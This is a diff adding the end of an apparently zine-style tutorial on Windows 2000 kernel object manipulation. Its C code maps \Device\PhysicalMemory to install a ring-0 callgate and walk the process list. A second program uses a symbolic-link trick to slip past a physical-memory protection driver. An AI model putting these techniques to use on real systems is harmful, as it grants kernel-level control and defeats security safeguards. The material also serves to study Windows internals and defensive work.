+         CurProcess = NextProcess;
+         // unmap old view and map a new one
+         // calculate next base address to map
+         vOldEntry = vCurEntry;
+         vCurEntry = (PVOID) (TO_EPROCESS(PsCur->Flink) & 0xFFF00000);
+
+         //printf("link: %x, process: %x, to_map: %x, padding: %x\n",
+         //    PsCur->Flink, TO_EPROCESS(PsCur->Flink),
+         //    vCurEntry, Padding);
+
+         // unmap old view
+         UnmapVirtualMemory(vOldEntry);
+         vOldEntry = vCurEntry;
+         // map new view
+         vCurEntry = MapVirtualMemory(Section, vCurEntry, 0x100000);
+         if (!vCurEntry)
+            break;
+         // adjust EPROCESS structure pointer
+         CurProcess =
+                 (PEPROCESS) ((DWORD) vCurEntry + CurMap.Offset + Padding);
+         // save mapped address
+         NewMappedAddress = vCurEntry;
+         // restore pointer from mapped addresses space 0x4**** to
+         // the real virtual address 0xf*******
+         vCurEntry = vOldEntry;
+      }
+
+      // reajust pointer to LIST_ENTRY struct
+      PsCur = &CurProcess->ActiveProcessLinks;
+      printf(" + %lu\t %s\n", CurProcess->UniqueProcessId,
+             CurProcess->ImageFileName[0] ?
+             CurProcess->ImageFileName : "[system]");
+      i++;
+   }
+
+   UnmapVirtualMemory(vCurEntry);
+}
+
+int main(int argc, char **argv) {
+   SYSTEM_INFO       SysInfo;
+   OBJECT_ATTRIBUTES ObAttributes;
+   NTSTATUS          ntS;
+   HANDLE            Section;
+   HMODULE           hDll;
+   INIT_UNICODE(ObString, L"\\Device\\PhysicalMemory");
+
+   printf(" *** win2k process lister ***\n\n");
+
+   GetSystemInfo(&SysInfo);
+   Granularity = SysInfo.dwAllocationGranularity;
+   printf("Allocation granularity: %lu bytes\n", Granularity);
+   InitializeObjectAttributes(&ObAttributes,
+                              &ObString,
+                              OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE,
+                              NULL,
+                              NULL);
+
+   hDll = LoadLibrary("ntoskrnl.exe");
+   if (hDll) {
+      MmGetPhysicalAddress = (PVOID) ((DWORD) BASEADD +
+                    (DWORD) GetProcAddress(hDll, "MmGetPhysicalAddress"));
+      printf("MmGetPhysicalAddress   : 0x%.8x\n", MmGetPhysicalAddress);
+      FreeLibrary(hDll);
+   }
+
+   ntS = NtOpenSection(&Section, SECTION_MAP_READ|SECTION_MAP_WRITE,
+                       &ObAttributes);
+   if (ntS != STATUS_SUCCESS) {
+      if (ntS == STATUS_ACCESS_DENIED)
+         printf("error: access denied to open
+                                      \\Device\\PhysicalMemory for r/w\n");
+      else
+         printf("error: NtOpenSection (code: %x)\n", ntS);
+      goto cleanup;
+   }
+
+   if (!InstallCallgate(Section, (DWORD) Ring0Func))
+      goto cleanup;
+
+   memset(&CurMap, 0, sizeof(MAPPING));
+
+   __try {
+      DisplayProcesses(Section);
+   } __except(UninstallCallgate(Section, (DWORD) Ring0Func), 1) {
+      printf("exception: trying to clean callgate...\n");
+      goto cleanup;
+   }
+
+   if (!UninstallCallgate(Section, (DWORD) Ring0Func))
+      goto cleanup;
+
+cleanup:
+   if (Section)
+      NtClose(Section);
+   return(0);
+}
+
+
+----[ 5.4 fun_with_ipd.c
+
+#include <stdio.h>
+#include <conio.h>
+#include <windows.h>
+#include "..\kmem.h"
+
+int main() {
+   NTSTATUS          ntS;
+   HANDLE            SymLink, Section;
+   OBJECT_ATTRIBUTES ObAttributes;
+   INIT_UNICODE(ObName, L"\\Device\\PhysicalMemory");
+   INIT_UNICODE(ObNewName, L"\\??\\hack_da_ipd");
+
+   InitializeObjectAttributes(&ObAttributes,
+                              &ObNewName,
+                              OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE,
+                              NULL,
+                              NULL);
+
+   ntS = NtCreateSymbolicLinkObject(&SymLink, SYMBOLIC_LINK_ALL_ACCESS,
+                                    &ObAttributes, &ObName);
+   if (ntS != STATUS_SUCCESS) {
+      printf("error: NtCreateSymbolicLinkObject (code: %x)\n", ntS);
+      return(0);
+   }
+
+   ntS = NtOpenSection(&Section, SECTION_MAP_READ, &ObAttributes);
+   if (ntS != STATUS_SUCCESS)
+      printf("error: NtOpenSection (code: %x)\n", ntS);
+   else {
+      printf("\\Device\\PhysicalMemory opened !!!\n");
+      NtClose(Section);
+   }
+   // now you can do what you want
+   getch();
+
+   NtClose(SymLink);
+   return(0);
+}
+
+
+--[ 6 - Conclusion
+
+I hope this article helped you to understand the base of Windows kernel
+objects manipulation. As far as i know you can do as much things as you can
+with linux's /dev/kmem so there is no restriction except your imagination
+:).
+I also hope that this article will be readen by Linux dudes.
+
+Thankx to CNS, u-n-f and subk dudes, ELiCZ for some help and finally
+syn/ack oldschool people (wilmi power) =]
+
+
+--[ 7 - References
+
+[1] Sysinternals - www.sysinternals.com
+[2] Microsoft DDK - www.microsoft.com/DDK/
+[3] unofficial ntifs.h - www.insidewindows.info
+[4] www.chapeaux-noirs.org/win/
+[5] Intel IA-32 Software Developper manual - developer.intel.com
+[6] Pedestal Software - www.pedestalsoftware.com
+[7] BindView's RAZOR - razor.bindview.com
+[8] Open Systems Resources - www.osr.com
+[9] MSDN - msdn.microsoft.com
+
+books:
+  * Undocumented Windows 2000 Secrets, A Programmer's Cookbook
+    (http://www.orgon.com/w2k_internals/)
+  * Inside Microsoft Windows 2000, Third Edition
+    (http://www.microsoft.com/mspress/books/4354.asp)
+  * Windows NT/2000 Native API Reference
+
+|=[ EOF ]=---------------------------------------------------------------=|
+
